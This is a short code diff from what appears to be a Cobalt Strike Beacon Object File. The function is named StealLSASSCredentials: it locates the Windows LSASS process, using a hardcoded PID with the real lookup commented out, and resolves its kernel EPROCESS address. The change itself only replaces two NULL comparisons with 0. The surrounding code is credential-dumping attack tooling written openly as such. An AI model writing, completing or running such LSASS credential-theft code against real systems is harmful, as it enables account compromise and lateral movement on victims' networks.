@@ -10,7 +10,7 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion)
 
     
     DWORD LsassPID = 740; //GetTargetProcessInformation(L"lsass.exe");
-    if (LsassPID == NULL)
+    if (LsassPID == 0)
     {
         BeaconPrintf(CALLBACK_ERROR, "Invalid LSASS PID! Returning...");
         return FALSE;
@@ -19,7 +19,7 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion)
     // // Get LSASS EPROCESS address
     DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile);
     DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA);
-    if (LsassEprocessVA == NULL)
+    if (LsassEprocessVA == 0)
        return FALSE;
 
         
